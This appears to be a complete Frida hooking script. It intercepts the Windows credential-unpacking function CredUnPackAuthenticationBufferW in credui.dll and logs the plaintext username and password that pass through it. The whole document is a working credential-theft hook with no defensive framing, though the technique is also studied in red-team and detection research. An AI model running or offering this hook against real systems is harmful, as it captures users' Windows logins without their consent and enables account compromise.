console.log('works!');
const CredUnPackAuthentication = Module.getExportByName('credui.dll','CredUnPackAuthenticationBufferW');

Interceptor.attach(CredUnPackAuthentication,{
	onEnter: function (args){
		console.log('Getting username and password pointers');
		this.ptr_user=args[3];
		this.ptr_pass=args[7];
		
	},
	onLeave: function (retval) {
		console.log('Post-Call Values');
		console.log(Memory.readUtf16String(this.ptr_user)+':'+Memory.readUtf16String(this.ptr_pass));
  }
});
